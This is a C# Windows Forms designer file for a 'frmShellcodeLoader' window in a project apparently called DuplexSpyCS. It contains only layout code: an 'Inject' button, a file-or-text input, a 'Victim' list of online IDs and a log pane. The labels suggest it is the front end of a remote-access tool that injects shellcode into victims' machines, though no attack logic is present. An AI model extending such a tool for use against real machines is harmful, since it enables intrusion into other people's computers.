namespace DuplexSpyCS
{
    partial class frmShellcodeLoader
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            button3 = new Button();
            button1 = new Button();
            textBox1 = new TextBox();
            radioButton2 = new RadioButton();
            radioButton1 = new RadioButton();
            button2 = new Button();
            tabControl1 = new TabControl();
            tabPage1 = new TabPage();
            listView1 = new ListView();
            columnHeader1 = new ColumnHeader();
            columnHeader2 = new ColumnHeader();
            statusStrip1 = new StatusStrip();
            toolStripStatusLabel1 = new ToolStripStatusLabel();
            tabPage2 = new TabPage();
            richTextBox1 = new RichTextBox();
            tabControl1.SuspendLayout();
            tabPage1.SuspendLayout();
            statusStrip1.SuspendLayout();
            tabPage2.SuspendLayout();
            SuspendLayout();
            // 
            // button3
            // 
            button3.Location = new Point(74, 43);
            button3.Name = "button3";
            button3.Size = new Size(334, 35);
            button3.TabIndex = 21;
            button3.Text = "...";
            button3.UseVisualStyleBackColor = true;
            button3.Click += button3_Click;
            // 
            // button1
            // 
            button1.Location = new Point(309, 12);
            button1.Name = "button1";
            button1.Size = new Size(99, 27);
            button1.TabIndex = 20;
            button1.Text = "...";
            button1.UseVisualStyleBackColor = true;
            button1.Click += button1_Click;
            // 
            // textBox1
            // 
            textBox1.Location = new Point(74, 12);
            textBox1.Name = "textBox1";
            textBox1.Size = new Size(229, 27);
            textBox1.TabIndex = 19;
            // 
            // radioButton2
            // 
            radioButton2.AutoSize = true;
            radioButton2.Location = new Point(13, 49);
            radioButton2.Name = "radioButton2";
            radioButton2.Size = new Size(55, 23);
            radioButton2.TabIndex = 18;
            radioButton2.TabStop = true;
            radioButton2.Text = "Text";
            radioButton2.UseVisualStyleBackColor = true;
            // 
            // radioButton1
            // 
            radioButton1.AutoSize = true;
            radioButton1.Location = new Point(13, 14);
            radioButton1.Name = "radioButton1";
            radioButton1.Size = new Size(51, 23);
            radioButton1.TabIndex = 17;
            radioButton1.TabStop = true;
            radioButton1.Text = "File";
            radioButton1.UseVisualStyleBackColor = true;
            // 
            // button2
            // 
            button2.Location = new Point(13, 84);
            button2.Name = "button2";
            button2.Size = new Size(397, 38);
            button2.TabIndex = 16;
            button2.Text = "Inject";
            button2.UseVisualStyleBackColor = true;
            button2.Click += button2_Click;
            // 
            // tabControl1
            // 
            tabControl1.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
            tabControl1.Controls.Add(tabPage1);
            tabControl1.Controls.Add(tabPage2);
            tabControl1.Location = new Point(1, 128);
            tabControl1.Name = "tabControl1";
            tabControl1.SelectedIndex = 0;
            tabControl1.Size = new Size(414, 440);
            tabControl1.SizeMode = TabSizeMode.Fixed;
            tabControl1.TabIndex = 24;
            // 
            // tabPage1
            // 
            tabPage1.Controls.Add(listView1);
            tabPage1.Controls.Add(statusStrip1);
            tabPage1.Location = new Point(4, 28);
            tabPage1.Name = "tabPage1";
            tabPage1.Padding = new Padding(3);
            tabPage1.Size = new Size(406, 408);
            tabPage1.TabIndex = 0;
            tabPage1.Text = "Victim";
            tabPage1.UseVisualStyleBackColor = true;
            // 
            // listView1
            // 
            listView1.Columns.AddRange(new ColumnHeader[] { columnHeader1, columnHeader2 });
            listView1.Dock = DockStyle.Fill;
            listView1.Location = new Point(3, 3);
            listView1.Name = "listView1";
            listView1.Size = new Size(400, 378);
            listView1.TabIndex = 1;
            listView1.UseCompatibleStateImageBehavior = false;
            listView1.View = View.Details;
            // 
            // columnHeader1
            // 
            columnHeader1.Text = "Online ID";
            columnHeader1.Width = 200;
            // 
            // columnHeader2
            // 
            columnHeader2.Text = "Status";
            columnHeader2.Width = 200;
            // 
            // statusStrip1
            // 
            statusStrip1.Font = new Font("Microsoft JhengHei UI", 11.25F, FontStyle.Regular, GraphicsUnit.Point);
            statusStrip1.Items.AddRange(new ToolStripItem[] { toolStripStatusLabel1 });
            statusStrip1.Location = new Point(3, 381);
            statusStrip1.Name = "statusStrip1";
            statusStrip1.Size = new Size(400, 24);
            statusStrip1.TabIndex = 0;
            statusStrip1.Text = "statusStrip1";
            // 
            // toolStripStatusLabel1
            // 
            toolStripStatusLabel1.Name = "toolStripStatusLabel1";
            toolStripStatusLabel1.Size = new Size(158, 19);
            toolStripStatusLabel1.Text = "toolStripStatusLabel1";
            // 
            // tabPage2
            // 
            tabPage2.Controls.Add(richTextBox1);
            tabPage2.Location = new Point(4, 24);
            tabPage2.Name = "tabPage2";
            tabPage2.Padding = new Padding(3);
            tabPage2.Size = new Size(406, 412);
            tabPage2.TabIndex = 1;
            tabPage2.Text = "Logs";
            tabPage2.UseVisualStyleBackColor = true;
            // 
            // richTextBox1
            // 
            richTextBox1.Dock = DockStyle.Fill;
            richTextBox1.Location = new Point(3, 3);
            richTextBox1.Name = "richTextBox1";
            richTextBox1.Size = new Size(400, 406);
            richTextBox1.TabIndex = 0;
            richTextBox1.Text = "";
            // 
            // frmShellcodeLoader
            // 
            AutoScaleDimensions = new SizeF(9F, 19F);
            AutoScaleMode = AutoScaleMode.Font;
            ClientSize = new Size(416, 570);
            Controls.Add(tabControl1);
            Controls.Add(button3);
            Controls.Add(button1);
            Controls.Add(textBox1);
            Controls.Add(radioButton2);
            Controls.Add(radioButton1);
            Controls.Add(button2);
            Font = new Font("Microsoft JhengHei UI", 11.25F, FontStyle.Regular, GraphicsUnit.Point);
            FormBorderStyle = FormBorderStyle.FixedToolWindow;
            Margin = new Padding(4);
            MaximizeBox = false;
            Name = "frmShellcodeLoader";
            StartPosition = FormStartPosition.CenterScreen;
            Text = "frmShellcodeLoader";
            FormClosed += frmShellcodeLoader_FormClosed;
            Load += frmShellcodeLoader_Load;
            tabControl1.ResumeLayout(false);
            tabPage1.ResumeLayout(false);
            tabPage1.PerformLayout();
            statusStrip1.ResumeLayout(false);
            statusStrip1.PerformLayout();
            tabPage2.ResumeLayout(false);
            ResumeLayout(false);
            PerformLayout();
        }

        #endregion
        private Button button3;
        private Button button1;
        private TextBox textBox1;
        private RadioButton radioButton2;
        private RadioButton radioButton1;
        private Button button2;
        private TabControl tabControl1;
        private TabPage tabPage1;
        private StatusStrip statusStrip1;
        private TabPage tabPage2;
        private ListView listView1;
        private ToolStripStatusLabel toolStripStatusLabel1;
        private RichTextBox richTextBox1;
        private ColumnHeader columnHeader1;
        private ColumnHeader columnHeader2;
    }
}